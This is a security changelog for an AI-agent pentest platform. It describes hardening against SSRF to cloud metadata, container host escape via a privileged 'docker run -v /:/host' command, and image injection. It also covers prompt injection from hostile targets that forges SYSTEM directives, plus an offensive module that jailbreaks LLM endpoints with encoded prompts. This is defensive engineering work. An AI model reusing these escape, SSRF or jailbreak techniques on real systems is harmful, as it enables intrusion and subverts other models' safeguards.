- **STRIDE hardening pass across the agent, recon, webapp, and tunnel surfaces.** SSRF egress guards reject loopback / RFC-1918 / link-local / cloud-metadata / CGNAT destinations on tradecraft-crawl fetches and redirects ([agentic/orchestrator_helpers/fetch_guard.py](agentic/orchestrator_helpers/fetch_guard.py), **I18**) and on URLs probed from a target's JavaScript ([recon/main_recon_modules/ip_filter.py](recon/main_recon_modules/ip_filter.py), **I14**). The agent WebSocket now requires a short-lived HS256 ticket that binds operator identity to `(projectId, sessionId)`, signed with a dedicated secret ([agentic/ws_ticket.py](agentic/ws_ticket.py), [webapp/src/lib/auth.ts](webapp/src/lib/auth.ts), **S6**). Tunnels activate only when explicitly enabled by the operator, and `/tunnel/configure` calls to kali-sandbox carry `TUNNEL_AUTH_TOKEN` so a rogue container can't drive `:8015` ([webapp/src/app/api/users/[id]/settings/route.ts](webapp/src/app/api/users/[id]/settings/route.ts), [mcp/servers/tunnel_manager.py](mcp/servers/tunnel_manager.py), **I19**/**S14**). Covered by new SSRF, ws-ticket, tunnel-gating, session-stop, and skill-switch tests, aggregated by [tests/run_security_remediation_suite.sh](tests/run_security_remediation_suite.sh).

---

## [5.3.2] - 2026-07-06

### Fixed

- **Recon graph writes silently broken on Windows (`cannot import name 'Neo4jClient' from 'graph_db' (unknown location)`)** ([recon_orchestrator/container_manager.py](recon_orchestrator/container_manager.py)). Every spawned scan container (recon / partial-recon / gvm / github-hunt / trufflehog) bind-mounts the host `graph_db/` package over `/app/graph_db`, deriving its host path as the sibling of the recon source via `Path(recon_path).parent / "graph_db"`. The orchestrator always runs Linux, so `PurePosixPath.parent` treats a Windows-style Docker `Source` (`C:\Users\...\recon`, as Docker Desktop reports it when the repo lives on the Windows filesystem) as a single path component and collapses it to the **relative** string `graph_db`. Docker Desktop then materializes that non-existent source as an **empty directory**, so Python imports `graph_db` as a PEP 420 namespace package with no `__init__.py` and every graph read/clear/update in the recon pipeline fails with the `(unknown location)` `ImportError` — the graph is never cleared and no recon nodes are ever written (agent-side writes still worked because the `agent` container bakes `graph_db` into its image). Replaced the five fragile derivations with a separator-aware `sibling_host_path()` helper that strips the final component on either `/` or `\`, yielding a real absolute host path on Windows while producing byte-identical output to the old code on Linux/macOS (zero behavior change there). Fixes apply automatically via `./redamon.sh update` (volume-mounted source, restart-only — no rebuild). Covered by [tests/test_sibling_host_path.py](tests/test_sibling_host_path.py), which imports the shipped function, pins the cross-platform output, and reproduces + guards against the exact Windows regression.

---

## [5.3.1] - 2026-07-05

### Security

- **Kali MCP surface hardening — authenticate + loopback-bind the offensive tool servers** ([docker-compose.yml](docker-compose.yml), [mcp/servers/_auth_middleware.py](mcp/servers/_auth_middleware.py), [mcp/servers/run_servers.py](mcp/servers/run_servers.py), [agentic/tools.py](agentic/tools.py), [redamon.sh](redamon.sh)). Closes a responsibly-disclosed unauthenticated-RCE surface (STRIDE **S10**/**I9**, partial **E1**): the Kali MCP servers (`8000/8002/8003/8004/8005`), progress streams (`8013/8014`), tunnel-manager (`8015`) and ngrok API (`4040`) — plus the datastores (`5432/7474/7687`) — are now published on `127.0.0.1` only. The container still binds `0.0.0.0` inside its network namespace, so the agent reaches every server over the internal `redamon` bridge unchanged, but a LAN/remote client can no longer reach the tool surface. A generated `MCP_AUTH_TOKEN` is now required as `Authorization: Bearer` on every MCP SSE request (pure-ASGI middleware server-side, existing `mcp_registry` `BearerAuth` plumbing client-side); it fails open with a warning only when the token is unset, so token-less dev stacks keep working. `4444` (reverse-shell catcher) is intentionally left routable for direct/no-tunnel reverse shells.
- **Datastore default-credential hardening (STRIDE S13)** ([redamon.sh](redamon.sh)). `ensure_db_secrets` generates strong `POSTGRES_PASSWORD`/`NEO4J_PASSWORD` on a **fresh** install (before the data volumes initialise) and **warns without rewriting** on an existing install still on the compose default (rewriting would break auth against the already-initialised volume). Combined with the loopback bind of `5432/7474/7687`, the "foothold → default-credentialed DB on the shared bridge" path is closed.
- Covered by [tests/redamon_secrets_test.sh](tests/redamon_secrets_test.sh), [tests/test_port_bindings.sh](tests/test_port_bindings.sh), [mcp/servers/tests/test_auth_middleware.py](mcp/servers/tests/test_auth_middleware.py), [agentic/tests/test_system_mcp_auth.py](agentic/tests/test_system_mcp_auth.py), [tests/test_exploit_blocked.sh](tests/test_exploit_blocked.sh), aggregated by [tests/run_security_remediation_suite.sh](tests/run_security_remediation_suite.sh). Threat-model status updated in [internal/security/README.TM.STRIDE.md](internal/security/README.TM.STRIDE.md).
- Reported responsibly by Kavin Kumar ([@kavinkumar0619](https://github.com/kavinkumar0619)); tracked as [GHSA-g49p-36p7-q46x](https://github.com/samugit83/redamon/security/advisories/GHSA-g49p-36p7-q46x) (CVE pending assignment).

---

## [5.3.0] - 2026-07-04

### Added

- **RAM-aware memory governor (host OOM protection)** ([graph_db/resource_governor.py](graph_db/resource_governor.py), [recon_orchestrator/admission_ledger.py](recon_orchestrator/admission_ledger.py), [container_manager.py](recon_orchestrator/container_manager.py), [docker_broker/broker.py](docker_broker/broker.py), [recon/project_settings.py](recon/project_settings.py), [agentic/project_settings.py](agentic/project_settings.py), [docker-compose.yml](docker-compose.yml), [redamon.sh](redamon.sh)). A dual-cap system that stops the host from running out of memory under concurrent scans + agent sessions. Every RAM-heavy knob keeps its configured ceiling **and** gains a second cap derived from live available memory (read from `/proc/meminfo`, VM-aware on Docker Desktop): concurrency/thread params scale by pressure ratio, while per-process/list units use a measured byte-budget. A **reservation ledger** admits recon scans only while their summed memory envelope fits a global budget, the excess is refused with a typed `hard`/`ram` reason instead of OOM-ing. **Every container is hard-capped**: compose `mem_limit`s + explicit neo4j JVM heap, per-spawn caps on scan containers, and 2 GB caps injected into sibling tool containers through the docker-broker. **Recon tool parameters** (~60 katana/nuclei/httpx/… knobs) and **agent concurrency** (fireteam members, plan-parallel tools, plus new WebSocket-session and background-job caps) throttle down under pressure, emitting red `[RESOURCE-CAP]` log lines. A startup RAM gate refuses to boot an undersized host, `mem_calibrate.py` measures real per-container envelopes into `resource_profile.json`, and the UI adds a bottom-bar htop-style RAM/CPU meter, red cap-log rendering in the recon drawer, and a memory-limit modal on refused scans. All knobs are env-overridable (documented in [.env.example](.env.example)) and fail-open. Covered by [tests/test_resource_governor.py](tests/test_resource_governor.py), [tests/test_admission_ledger.py](tests/test_admission_ledger.py), [tests/test_broker_inject.py](tests/test_broker_inject.py), [tests/test_recon_mem_governor.py](tests/test_recon_mem_governor.py), [tests/test_agent_mem_governor.py](tests/test_agent_mem_governor.py), and [tests/redamon_governor_test.sh](tests/redamon_governor_test.sh).

---

---

## [5.2.1] - 2026-07-01

### Changed

- **Adaptive memory-safe Docker builds** ([redamon.sh](redamon.sh)). All image builds now route through a `compose_build` wrapper that builds the RAM-heavy `webapp` (Next.js) image in isolation first, then caps parallelism based on the memory/CPU reported by `docker info` (VM-aware on macOS/Windows). Fixes the OOM kill (`exit 137`) that could abort `./redamon.sh update` when webapp built in parallel with the `agent` image. Override with `REDAMON_BUILD_PARALLEL=N` (`0` = unbounded). Covered by [tests/redamon_build_test.sh](tests/redamon_build_test.sh).

---

## [5.2.0] - 2026-06-30

### Added

- **Web Cache Poisoning & Deception module** ([recon/cache_scan/](recon/cache_scan/), [wcvs/Dockerfile](wcvs/Dockerfile), [graph_db/mixins/cache_mixin.py](graph_db/mixins/cache_mixin.py), [recon/partial_recon_modules/cache_scanning.py](recon/partial_recon_modules/cache_scanning.py), [WebCachePoisonSection.tsx](webapp/src/components/projects/ProjectForm/sections/WebCachePoisonSection.tsx), [schema.prisma](webapp/prisma/schema.prisma)). New active **GROUP 6 Phase A** vulnerability scanner that detects **web cache poisoning** and **web cache deception** on the live URLs recon already discovered, running in parallel with Nuclei / GraphQL / Subdomain Takeover / VHost & SNI. It is a two-engine pipeline: the third-party **WCVS** (Hackmanit, Docker-in-Docker) provides breadth across 10+ technique classes (unkeyed-header poisoning, parameter cloaking, path/cache-key normalization, cache-key injection, web cache deception) to "find suspects", then a **RedAmon-native 5-phase confirmation engine** re-proves each one to "prove it": a header-based cache oracle (with a silent-cache frozen-Date fallback for caches that emit no `X-Cache`/`Age`), an isolated per-test cache-buster, fingerprint-gated framework hypothesis packs (Next.js / Nuxt / Remix), a baseline→poison→clean persistence check, and confidence scoring. Detection runs both **reflected** (echoed benign `.invalid` canary) and **non-reflective differential** (persisted status / `Location` / body change) modes, the latter guarded against false positives by requiring stability across two clean baselines. Findings are scored into `Confirmed` / `Strong` / `Tentative` tiers, and only those at or above the min-confidence gate (default 0.8) are written to the graph as `Vulnerability {source:"cache_poisoning"}` nodes MERGEd onto the affected Endpoint + BaseURL. Safe by design: benign non-resolving canaries, isolated cache buckets so the real entry is never poisoned, three scan profiles (`safe-confirm` / `extended` / `research`), CPDoS off unless explicitly enabled in the research profile, RoE-gated, capped at 200 URLs, and disabled entirely under stealth. Available in a full recon run and as a one-tool **Partial Recon** run. Off by default (it sends active probes). Covered by [recon/tests/test_cache_scan.py](recon/tests/test_cache_scan.py) (unit) + [recon/tests/test_cache_scan_integration.py](recon/tests/test_cache_scan_integration.py) (live Neo4j wiring). Docs: [readmes/README.WCP_RECON_MODULE.md](readmes/README.WCP_RECON_MODULE.md) + wiki [Web Cache Poisoning](https://github.com/samugit83/redamon/wiki/Web-Cache-Poisoning).

- **Web Cache Poisoning report section + graph-aware agent** ([reportData.ts](webapp/src/lib/report/reportData.ts), [reportTemplate.ts](webapp/src/lib/report/reportTemplate.ts), [agentic/prompts/base.py](agentic/prompts/base.py), [readmes/GRAPH.SCHEMA.md](readmes/GRAPH.SCHEMA.md)). Confirmed cache-poisoning findings flow into a dedicated **pentest-report section** with a per-finding risk contribution, and the `cache_poisoning` Vulnerability source (carrying `confidence_tier`, `cache_header` / `cache_param`, `cache_impact`, `cache_buster`, plus hoisted `poc_link` + `curl_verify`) is documented in the graph schema and the NL-to-Cypher agent prompt, so the chat agent can query and reason over the findings.

---

## [5.1.3] - 2026-06-29

### Security

- **Custom-LLM `baseUrl` SSRF and TLS-verify-off MITM closed (closes I15, I16; partial I12)** ([llm_url_guard.py](agentic/orchestrator_helpers/llm_url_guard.py), [api.py](agentic/api.py), [llm_setup.py](agentic/orchestrator_helpers/llm_setup.py), [llm-url-guard.ts](webapp/src/lib/llm-url-guard.ts), [presets/generate/route.ts](webapp/src/app/api/presets/generate/route.ts)). The agent lets an operator point any provider at a custom `baseUrl` and issues live requests to it — and the key-holding, largely-unauthenticated agent did so with **no scheme or address checks**, so a caller (or, via the old wildcard CORS, any website the operator visited) could make the agent probe internal services or read cloud metadata (`http://169.254.169.254/…`) from a container holding `INTERNAL_API_KEY` / Neo4j / LLM keys, and could disable TLS verification on a connection carrying the operator's API key + full prompt. A new shared guard (`validate_llm_base_url`) now runs **before any request** at both sinks — the `/llm-provider/test` endpoint and the runtime `setup_llm()` (openai-compatible, anthropic, and legacy env branches) — plus the webapp preset generator (`assertSafeLlmBaseUrl`). It rejects non-`http(s)` schemes and any host that resolves to cloud-metadata / link-local addresses (AWS/GCP/Azure `169.254.169.254`, ECS `169.254.170.2`, Alibaba `100.100.100.200`, AWS IPv6 `fd00:ec2::254`, `metadata.google.internal`); because it resolves through the **same `getaddrinfo` the client uses**, integer/hex/octal IP encodings (`http://2852039166/`) and IPv4-mapped IPv6 normalize to the real address and are caught, and DNS-rebind-at-resolve and `user@host` decoys are handled. `sslVerify=false` is refused for **public** hosts (the I16 MITM exposure) while still allowed for private/internal self-signed endpoints. Self-hosted models are explicitly preserved: localhost / RFC1918 / Docker-service / unresolvable hosts pass untouched (verified end-to-end against a live Ollama `qwen2.5:0.5b` at `172.25.0.1:11435` — success with TLS on and off, through both the agent endpoint and the full browser→webapp→agent "Test" path). I12 is only **partially** reduced: exfiltration to an attacker's *public* endpoint is indistinguishable from a legitimate bring-your-own provider and remains open pending an opt-in operator allowlist. Exploit reproduced pre-patch (metadata request fired; ~20 s SSRF hang live) and neutralised post-patch (instant 400) in [test_ssrf_exploit_reproduction.py](agentic/tests/test_ssrf_exploit_reproduction.py) (6) + [test_llm_url_guard.py](agentic/tests/test_llm_url_guard.py) (25, incl. encoding/IPv4-mapped/userinfo bypass variants) + [test_agent_cors_and_baseurl_endpoint.py](agentic/tests/test_agent_cors_and_baseurl_endpoint.py) (7) + [llm-url-guard.test.ts](webapp/src/lib/llm-url-guard.test.ts) (20).

- **Agent FastAPI CORS scoped to the webapp origin (closes I17)** ([api.py](agentic/api.py)). The agent served `Access-Control-Allow-Origin: *` on its unauthenticated endpoints, so any website the operator visited could script their browser into reading agent responses cross-origin (cross-tenant secrets via `/graph/exec`, scraped artifacts via `/workspace/download`) or driving `/emergency-stop-all` and `/llm/*`. CORS is now scoped to `http://localhost:3000` / `http://127.0.0.1:3000` (matching the recon-orchestrator), overridable via the `AGENT_CORS_ORIGINS` env for non-localhost deployments. This is safe because all browser→agent HTTP is proxied through the webapp and the direct browser WebSockets (`/ws/agent`, `/ws/kali-terminal`) bypass `CORSMiddleware` — verified live: allowed origin granted, evil origin refused, with chat, Kali terminal, and proxied endpoints unaffected. It also removes the browser-drive-by trigger for the `baseUrl` SSRF above and the cross-origin-read amplification of S5/S6/I5/I6/D2/D3 (whose LAN/tunnel vector still requires the separately-tracked endpoint authentication).

- **MCP offensive-progress endpoints no longer wildcard-CORS readable (partial I9)** ([network_recon_server.py](mcp/servers/network_recon_server.py), [metasploit_server.py](mcp/servers/metasploit_server.py)). The Hydra and Metasploit progress/session servers streamed live exploitation data — including cracked credentials — with `Access-Control-Allow-Origin: *`, letting any website the operator visited read them cross-origin via the browser. The wildcard header (and its OPTIONS preflight) is removed; these endpoints are consumed only server-side by the agent container (`kali-sandbox:8013/8014`, verified still serving with no CORS header). **Partial**: the servers still bind `0.0.0.0` with no authentication, so a direct LAN read remains — full closure needs loopback binding + auth, tracked separately.

---

## [5.1.2] - 2026-06-28

### Security

- **CodeFix builds now run in an isolated sandbox (closes T6 / E10 / E14 / T7)** ([codefix_sandbox/](codefix_sandbox/), [container_manager.py](recon_orchestrator/container_manager.py), [bash_tool.py](agentic/cypherfix_codefix/tools/bash_tool.py), [github_repo.py](agentic/cypherfix_codefix/tools/github_repo.py)). The CodeFix agent clones and builds operator repositories, which can carry attacker-influenced content (malicious `postinstall`, prompt-injected build steps). Previously `github_bash` ran build/test commands **inside the agent container** — which holds `INTERNAL_API_KEY`, the Neo4j/Postgres creds, every per-user LLM key, and the GitHub token — behind a trivially-bypassable 4-pattern blocklist, so a poisoned build meant full credential theft. Build/test execution is now relocated to an **ephemeral, per-job sandbox container**: secret-free env, `cap_drop=ALL`, read-only rootfs, non-root, resource-limited, on an isolated `codefix-net` (NAT egress only, no RedAmon peer). Privilege escalation is blocked by stripping setuid/setgid bits in the image (portable across hosts; the `no-new-privileges` runtime flag is intentionally avoided because snap-Docker/AppArmor blocks `execve` for non-root users under it). It is driven via `docker exec` through `agent → webapp (X-Internal-Key) → orchestrator (X-Orchestrator-Key)`, so the agent gains no new orchestrator reach and the sandbox shares no network with it. The isolated network has no attached service, so the orchestrator creates it on demand (`_ensure_codefix_network`). Companion hardening in `github_repo.py`: GitHub token via `GIT_ASKPASS` (never in the clone URL/`.git/config`, never enters the sandbox), `.git` mounted read-only, git hooks disabled, commit scoped to approved files (no `git add -A`), and a push branch allow-list (refuses default/`main`/`master`). Falls back to *disabled* (not in-agent) if the sandbox image is absent. Lifecycle is wired into `redamon.sh` (`TOOL_IMAGES` + `update` smart-rebuild map), so `install`/`update`/`up` build the image automatically. Covered by [test_codefix_sandbox_security.py](agentic/tests/test_codefix_sandbox_security.py) (exploit reproduction + neutralisation, 38 tests).

- **Honeypot prompt-injection via chain-context previews closed (closes T14)** ([prompt_safety.py](agentic/prompt_safety.py), [state.py](agentic/state.py)). The agent reads tool output to decide its next move, so a hostile target can embed fake instructions in its responses. RedAmon framed the main tool-result channel in an unforgeable random-nonce boundary (`wrap_untrusted()`), but the **execution-chain summary** (`format_chain_context()`, injected into the *system* prompt) spliced short raw previews of tool output — and tool **error** strings — into the trusted region **without** a boundary, so a short payload could steer the agent's subsequent tool calls. Added `wrap_untrusted_inline()` (a single-line nonce boundary) and applied it to all five preview paths: the per-step digest fingerprint, the wave and single-tool output previews, and the single-tool and wave tool-error previews. `output_analysis` and other agent-generated text stay unwrapped (not attacker bytes). Covered by [test_t14_prompt_injection_previews.py](agentic/tests/test_t14_prompt_injection_previews.py) (pre-patch leak reproduction from git HEAD + post-patch containment + integration, 23 tests).

---

## [5.1.1] - 2026-06-26

### Fixed

- **AI Gauntlet (promptfoo): encoding strategies now actually run** ([local_strategies.py](ai_attack_surface_scan/adapters/promptfoo/local_strategies.py), [adapter.py](ai_attack_surface_scan/adapters/promptfoo/adapter.py), [plugins.py](ai_attack_surface_scan/adapters/promptfoo/plugins.py), [Dockerfile](ai_attack_surface_scan/Dockerfile)). Base64 / ROT13 / Leetspeak / Morse / Pig Latin were silently skipped: promptfoo 0.121.17 gates them behind its remote service, which the scan disables for zero egress, so only `basic` ran. The adapter now applies these deterministic transforms itself, offline, after `generate` (one tagged variant per strategy, prompt re-encoded with a decode instruction). Zero egress preserved. Verified by 70 tests plus a live run where base64/leetspeak/morse scored jailbreak hits that plaintext missed.

- **AI Gauntlet UI: custom targets require a model id; promptfoo judge default fixed** ([page.tsx](webapp/src/app/ai-attack-surface/page.tsx)). An empty custom-target model degraded to `"default"`, 404'ing every attack (`model 'default' not found`); the field is now required at add-time. The promptfoo Judge default changed from the rarely-pulled `qwen2.5:7b` to `qwen2.5:0.5b`.

---

## [5.1.0] - 2026-06-24

### Security

- **Worker no longer holds the master `INTERNAL_API_KEY`** ([docker-compose.yml](docker-compose.yml)) — removed the blanket service credential from the `kali-sandbox` (worker) container, the least-trusted, target-facing component. It was dead config (no worker process read it) but readable by anyone who compromised the worker, granting a bypass of all webapp auth. Verified absent from the running worker with zero functional regression.

- **Docker socket broker for recon containers (host-escape prevention)** ([docker_broker/](docker_broker/), [docker-compose.yml](docker-compose.yml), [recon_orchestrator/container_manager.py](recon_orchestrator/container_manager.py)) — the recon/partial-recon containers mounted the raw `/var/run/docker.sock` to spawn their tool containers, so a compromised recon container could `docker run -v /:/host --privileged` and own the host. They now mount a **filtering broker** socket instead: the broker holds the real socket (trusted, like the orchestrator) and validates every container-create, rejecting host escapes (bind-mounting `/`, `--privileged`, dangerous caps/namespaces, mounting the docker socket, non-allowlisted images) while transparently forwarding legitimate tool runs. Baking the tools in-process was ruled out — most are AGPL/GPL and are deliberately isolated for license compliance — so this preserves the container model with **zero recon code changes**. Verified by unit tests (policy 26/26, plumbing 9/9) and a live recon scan (naabu+httpx ran through the broker; exploit blocked; no collateral). The orchestrator keeps the real socket.

- **Recon containers de-privileged; worker `SYS_PTRACE` dropped (capability scoping)** ([recon_orchestrator/container_manager.py](recon_orchestrator/container_manager.py), [docker-compose.yml](docker-compose.yml)) — the recon/partial-recon containers ran with `privileged: true`, which grants every Linux capability plus host device access, disables seccomp, and unmasks `/proc` — a full host-escape primitive (reproduced: the container could `mount` and saw the host's `/dev/nvme*` disks, i.e. mount and read/write the host filesystem). They now request only `cap_add: [NET_RAW]`; Docker's default capability set already includes `NET_RAW`, which is all the native `masscan`/`nmap` SYN scans need, so scanning is unaffected while `mount` and host-device access are gone (post-patch: `mount` returns EPERM, no host disks visible, `masscan`/`nmap -sS` still succeed). Separately, the `kali-sandbox` worker dropped the unused `SYS_PTRACE` capability (a process-memory-snoop primitive no worker tool uses), keeping `NET_RAW` (scanners) and `NET_ADMIN` (exploit tunneling). Verified at runtime (`CapAdd=[CAP_NET_ADMIN CAP_NET_RAW]`, raw sockets + SYN scans still work) and regression-tested in [internal/tests/test_hardening.sh](internal/tests/test_hardening.sh).

- **Worker MCP server source is read-only (anti-persistence)** ([docker-compose.yml](docker-compose.yml), [mcp/kali-sandbox/entrypoint.sh](mcp/kali-sandbox/entrypoint.sh)) — `./mcp/servers` was bind-mounted read-write into the worker and `importlib`-loaded at boot, so an attacker with worker RCE could trojanize a server file for restart-surviving persistence. It's now mounted `:ro` with `PYTHONDONTWRITEBYTECODE=1` (no `__pycache__` writes). A 4-way audit confirmed user MCP plugins are DB-resident (unaffected); the live audit also caught that MCP processes ran with `cwd=/opt/mcp_servers`, so the entrypoint now `cd /tmp` (writable scratch) and launches `run_servers.py` by absolute path, keeping relative-path tool/agent output working. Verified: worker-side writes to `/opt/mcp_servers` now fail (read-only) while all MCP servers/tools and the agent connection work.

- **Tool Docker images are allowlisted (anti image-injection)** ([recon/project_settings.py](recon/project_settings.py)) — recon modules read `*_DOCKER_IMAGE` from project settings (webapp-influenced) and pass them to `docker run` on the host daemon, so an injected `attacker/evil:latest` was arbitrary container execution on the host. A single chokepoint (`sanitize_image_settings`, run at the end of `fetch_project_settings`) now pins all 15 `*_DOCKER_IMAGE` settings to the shipped allowlist (derived from `DEFAULT_SETTINGS`); non-allowlisted values are reset to the shipped default. Because these images are user-configurable, the allowlist is operator-extensible via the server-side `RECON_EXTRA_ALLOWED_IMAGES` env (comma-separated; empty = strict) for private-registry / air-gapped deployments, without re-opening the hole. Exploit reproduced + fixed in [test_image_allowlist.py](recon/tests/test_image_allowlist.py).

- **Orchestrator no longer trusts client-supplied `webapp_api_url` (SSRF / key-leak)** ([recon_orchestrator/api.py](recon_orchestrator/api.py), [docker-compose.yml](docker-compose.yml)) — the orchestrator's "start scan" endpoints took a `webapp_api_url` from the request body and sent the master `INTERNAL_API_KEY` to it (directly and via spawned scan containers), so a caller could exfiltrate the key to an arbitrary host. All credentialed calls now use server-controlled URLs: `WEBAPP_API_URL` (`http://webapp:3000`) for the orchestrator's own pre-flight, and `SPAWNED_WEBAPP_API_URL` (`http://localhost:3000`) forwarded to host-network scan containers. The request field is inert; client input can no longer redirect the key. Unit-tested in [test_guardrail_webapp_base.py](recon_orchestrator/tests/test_guardrail_webapp_base.py).

- **Worker no longer holds the master Neo4j credential** ([mcp/servers/redagraph.py](mcp/servers/redagraph.py), [agentic/api.py](agentic/api.py), [docker-compose.yml](docker-compose.yml)) — the kali-sandbox worker carried `NEO4J_PASSWORD` for its `redagraph` graph CLI. App-level scoping is moot once the worker is compromised (the easy foothold): with the master cred an attacker opens a raw driver and gets full read **and write** to the whole graph (exfiltrate all recon data + discovered secrets, poison the agent's source of truth, or wipe it). Neo4j Community has no RBAC, so a scoped DB user is impossible. `redagraph` is now a thin client to a new agent endpoint `POST /graph/exec` that enforces read-only + tenant scoping + fixed `types`/`schema` queries **server-side** (no raw/unscoped path); the worker's `NEO4J_*` env is removed entirely. A compromised worker drops from "master read+write on all data" to "read-only, tenant-scoped reads via the agent". Verified live (reads proxy through with no worker creds; writes/unscoped rejected) and by `tests/test_redagraph.py` (54) + `agentic/tests/test_graph_exec.py` (13 server-side enforcement).

- **Prompt-injection boundary for untrusted tool output** ([agentic/prompt_safety.py](agentic/prompt_safety.py), [agentic/state.py](agentic/state.py), [agentic/prompts/base.py](agentic/prompts/base.py), agent think/fireteam nodes, cypherfix, report-summarizer, tradecraft) — the agent framed tool output as a hand-built text prompt (`{tool_output}` interpolated raw inside a ``` fence), not native structured tool-use. Because scanned targets are hostile, a crafted response could close the fence and forge a `## `/`SYSTEM:` directive to inject instructions into the trusted agent (which holds the secrets) — the STRIX-style escape, reproduced as a test. Every untrusted value is now wrapped by `wrap_untrusted()` in a **per-call random-nonce sentinel** the worker cannot predict (so it can never forge the closing marker), with look-alike markers neutralised (content kept verbatim) and a standing instruction telling the model to treat marked regions as data only. Applied at the live ReAct-loop chokepoints (the shared `state.py` trace/chain formatters — which also cover deep-think and report generation — plus the think-node and fireteam tool-output sections) and the side subsystems (cypherfix codefix/triage, report summarizer, tradecraft crawl/lookup); offloaded stubs, `fs_read`, and `query_graph` results inherit coverage. Verified: 27 unit + 14 integration tests ([agentic/tests/test_prompt_safety.py](agentic/tests/test_prompt_safety.py), [test_dp2_integration.py](agentic/tests/test_dp2_integration.py), incl. bypass variants and a pre-patch-vs-post-patch reproduction) — the injection ends up trapped inside the data region, forged markers neutralised.

- **Recon-orchestrator API authentication** ([recon_orchestrator/auth.py](recon_orchestrator/auth.py), [recon_orchestrator/api.py](recon_orchestrator/api.py), [webapp/src/lib/orchestrator.ts](webapp/src/lib/orchestrator.ts), [redamon.sh](redamon.sh), [docker-compose.yml](docker-compose.yml)) — the orchestrator holds the real Docker socket and had zero auth on its ~42 routes. Network isolation stops bridge peers (the worker) from reaching it, but a host-net peer (a compromised recon container) shares the host loopback and can still reach `127.0.0.1:8010`. Every route except `/health` now requires an `X-Orchestrator-Key` header, enforced by a fail-closed middleware whose decision lives in a dependency-free `auth.py` module and uses a **constant-time** comparison (`hmac.compare_digest`, no key-timing leak). The key is a **distinct** secret, `ORCHESTRATOR_API_KEY` (auto-generated by `redamon.sh` like `INTERNAL_API_KEY`), shared only with the webapp — deliberately not `INTERNAL_API_KEY`, which the recon containers hold and could otherwise replay. The webapp sends it through a shared `orchestratorFetch` helper across all 39 calling routes; the worker and spawned scan containers never receive it. Exploit reproduced + fixed in [test_orchestrator_auth.py](recon_orchestrator/tests/test_orchestrator_auth.py) (pre-patch unauth call = 200, post-patch = 401); verified live: host-net call without the key → 401, `/health` → 200, webapp with the key → 200, wrong key → 401.

- **Recon-orchestrator network isolation** ([docker-compose.yml](docker-compose.yml)) — moved the privileged orchestrator (Docker-socket holder) off the shared `redamon` network onto a dedicated `redamon-orchestrator-net` shared only with the multi-homed webapp and the on-demand Ollama judge, and rebound its host port from `0.0.0.0:8010` to `127.0.0.1:8010`. A compromised worker can no longer reach the orchestration API (verified: NXDOMAIN on `recon-orchestrator`, and the host-gateway back door is closed by the loopback bind), severing the worker→orchestrator escalation path. Webapp access and the AI Gauntlet Ollama path are preserved (`LOCAL_LLM_NETWORK`).

### Fixed

- **Recon pre-flight guardrail/RoE check was silently disabled** ([recon_orchestrator/api.py](recon_orchestrator/api.py), [docker-compose.yml](docker-compose.yml)) — the orchestrator's `/recon/start` pre-flight fetched the project from the client-supplied `localhost:3000`, which is unreachable from the orchestrator container, so the deterministic hard-guardrail and RoE time-window checks were skipped (caught and "proceed"). It now uses the orchestrator's own trusted `WEBAPP_API_URL` (`http://webapp:3000`, reachable since the V1 network change), reviving RoE enforcement for recon scans and ensuring the credentialed call (`INTERNAL_API_KEY`) goes only to the trusted webapp, not a client-named URL (V2). Covered by [test_guardrail_webapp_base.py](recon_orchestrator/tests/test_guardrail_webapp_base.py).

- **Tunnel config auto-restore on worker restart** ([entrypoint.sh](mcp/kali-sandbox/entrypoint.sh), [tunnel-config/sync/route.ts](webapp/src/app/api/global/tunnel-config/sync/route.ts), [middleware.ts](webapp/src/middleware.ts)) — the worker's boot-time tunnel-config pull always 401'd (it sent no auth) and spammed retry logs. Replaced with a push model: the worker calls an unauthenticated `/api/global/tunnel-config/sync` trigger and the webapp pushes the saved config to the worker's tunnel-manager. Tunnels now auto-restore on restart without the worker holding any secret; the credential-returning GET stays gated. Regression-tested in [middleware.test.ts](webapp/src/middleware.test.ts).

---

## [5.0.0] - 2026-06-22

### Added

- **AI Gauntlet — offensive AI/LLM testing** ([ai_attack_surface_scan/](ai_attack_surface_scan/), [webapp/src/app/ai-attack-surface/page.tsx](webapp/src/app/ai-attack-surface/page.tsx), [recon_orchestrator/container_manager.py](recon_orchestrator/container_manager.py), [normalizer.py](ai_attack_surface_scan/normalizer.py)) — new offensive module that attacks the LLM endpoints recon discovered, running selected `Endpoint` targets through four red-team tools in isolated per-tool venvs / Node CLI: **garak** (broad single-shot, 40 probe families), **PyRIT** (bounded multi-turn jailbreaks), **Giskard** (LLM-assisted safety scan), and **promptfoo** (dataset red-team eval). A short-lived host-network container runs the chosen tool with operator-set bounds (generations, ASR threshold, judge model, max turns, seed) behind a mandatory RoE gate, streams live `[Phase 1..4]` progress to the UI over SSE, and normalizes every tool's output into unified `Vulnerability` findings (OWASP-LLM / ATLAS mapped, ASR + trials + transcript ref) MERGEd back onto the attacked endpoint — materialising the target node chain for custom / off-graph URLs so a finding never orphans. Deterministic and **zero external egress**: all judge/grader/embedding calls are forced to a local Ollama model (default `qwen2.5:7b`) and `OPENAI_API_KEY` is stripped from every tool subprocess. Off by default (it sends adversarial payloads). Docs: [readmes/AI_GAUNTLET_TECH_DOC.md](readmes/AI_GAUNTLET_TECH_DOC.md) + wiki [AI Gauntlet](https://github.com/samugit83/redamon/wiki/AI-Gauntlet).

- **AI Gauntlet Vulnerabilities table + report section** ([AiTables.tsx](webapp/src/app/graph/components/RedZoneTables/AiTables.tsx), [reportTemplate.ts](webapp/src/lib/report/reportTemplate.ts)) — the confirmed, payload-tested findings get a new sub-sheet in the Red Zone **AI Risk** Data Table (tool, OWASP-LLM id, attack chip, target, ASR, trials, severity, transcript) and a dedicated **Tested Vulnerabilities — AI Gauntlet** report section that highlights cross-tool corroboration (a weakness confirmed by more than one tool).

---

## [4.15.1] - 2026-06-06

### Fixed

